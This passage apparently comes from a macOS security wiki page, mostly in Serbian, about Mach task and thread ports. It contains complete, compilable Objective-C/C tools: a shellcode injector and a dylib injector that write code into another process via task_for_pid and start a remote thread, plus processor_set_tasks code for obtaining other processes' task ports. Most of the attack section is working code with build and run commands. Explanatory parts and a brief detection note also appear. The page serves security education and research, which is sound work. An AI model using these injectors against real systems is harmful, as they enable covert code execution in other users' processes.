**Port imena zadatka:** Nepovlašćena verzija _port zadatka_. Referencira zadatak, ali ne dozvoljava kontrolu nad njim. Jedina stvar koja se čini dostupnom kroz njega je `task_info()`.

### Thread Ports

Niti takođe imaju povezane portove, koji su vidljivi iz zadatka koji poziva **`task_threads`** i iz procesora sa `processor_set_threads`. SEND pravo nad portom niti omogućava korišćenje funkcija iz `thread_act` pod sistema, kao što su:

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

Svaka nit može dobiti ovaj port pozivajući **`mach_thread_sef`**.

### Shellcode Injection in thread via Task port

Možete uzeti shellcode iz:

{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**Kompajlirati** prethodni program i dodati **entitlements** da bi mogli da injektujete kod sa istim korisnikom (ako ne, moraćete da koristite **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> Da bi ovo radilo na iOS-u, potrebna vam je dozvola `dynamic-codesigning` kako biste mogli da napravite izvršnu memoriju koja se može pisati.

### Dylib injekcija u niti putem Task porta

U macOS-u **niti** se mogu manipulisati putem **Mach** ili korišćenjem **posix `pthread` api**. Nit koju smo generisali u prethodnoj injekciji, generisana je korišćenjem Mach api, tako da **nije posix kompatibilna**.

Bilo je moguće **injektovati jednostavan shellcode** za izvršavanje komande jer **nije bilo potrebno raditi sa posix** kompatibilnim apijima, samo sa Mach. **Složenije injekcije** bi zahtevale da **nit** takođe bude **posix kompatibilna**.

Stoga, da bi se **poboljšala nit**, trebalo bi da pozove **`pthread_create_from_mach_thread`** koja će **napraviti validan pthread**. Zatim, ovaj novi pthread može **pozvati dlopen** da **učita dylib** iz sistema, tako da umesto pisanja novog shellcode-a za izvođenje različitih akcija, moguće je učitati prilagođene biblioteke.

Možete pronaći **primer dylibs** u (na primer, onaj koji generiše log i zatim možete slušati):

{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

U ovoj tehnici se otima nit procesa:

{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Task Port Injection Detection

Kada se poziva `task_for_pid` ili `thread_create_*`, povećava se brojač u strukturi task iz kernela koji može biti pristupljen iz korisničkog moda pozivom task_info(task, TASK_EXTMOD_INFO, ...)

## Exception Ports

Kada dođe do izuzetka u niti, ovaj izuzetak se šalje na određeni izuzetan port te niti. Ako nit ne obradi izuzetak, onda se šalje na portove izuzetaka zadatka. Ako zadatak ne obradi izuzetak, onda se šalje na port domaćina koji upravlja launchd (gde će biti potvrđen). Ovo se naziva triage izuzetaka.

Napomena da na kraju, obično, ako se ne obradi pravilno, izveštaj će biti obrađen od strane ReportCrash demona. Međutim, moguće je da druga nit u istom zadatku upravlja izuzetkom, što rade alati za izveštavanje o padovima poput `PLCreashReporter`.

## Other Objects

### Clock

Svaki korisnik može pristupiti informacijama o satu, međutim, da bi postavio vreme ili izmenio druge postavke, mora biti root.

Da bi dobio informacije, moguće je pozvati funkcije iz `clock` podsystema kao što su: `clock_get_time`, `clock_get_attributtes` ili `clock_alarm`\
Da bi izmenio vrednosti, `clock_priv` podsystem se može koristiti sa funkcijama kao što su `clock_set_time` i `clock_set_attributes`

### Processors and Processor Set

API-ji procesora omogućavaju kontrolu jednog logičkog procesora pozivajući funkcije kao što su `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...

Pored toga, **processor set** API-ji pružaju način za grupisanje više procesora u grupu. Moguće je dobiti podrazumevani skup procesora pozivajući **`processor_set_default`**.\
Ovo su neki zanimljivi API-ji za interakciju sa skupom procesora:

- `processor_set_statistics`
- `processor_set_tasks`: Vraća niz prava slanja za sve zadatke unutar skupa procesora
- `processor_set_threads`: Vraća niz prava slanja za sve niti unutar skupa procesora
- `processor_set_stack_usage`
- `processor_set_info`

Kao što je pomenuto u [**ovom postu**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/), u prošlosti je ovo omogućavalo zaobilaženje prethodno pomenute zaštite da se dobiju portovi zadataka u drugim procesima kako bi ih kontrolisali pozivajući **`processor_set_tasks`** i dobijajući port domaćina na svakom procesu.\
Danas vam je potreban root da biste koristili tu funkciju i ovo je zaštićeno, tako da ćete moći da dobijete ove portove samo na nezaštićenim procesima.

Možete to isprobati sa:

<details>

<summary><strong>processor_set_tasks code</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:

{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:

{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## References

- [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
- [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)

{{#include ../../../../banners/hacktricks-training.md}}
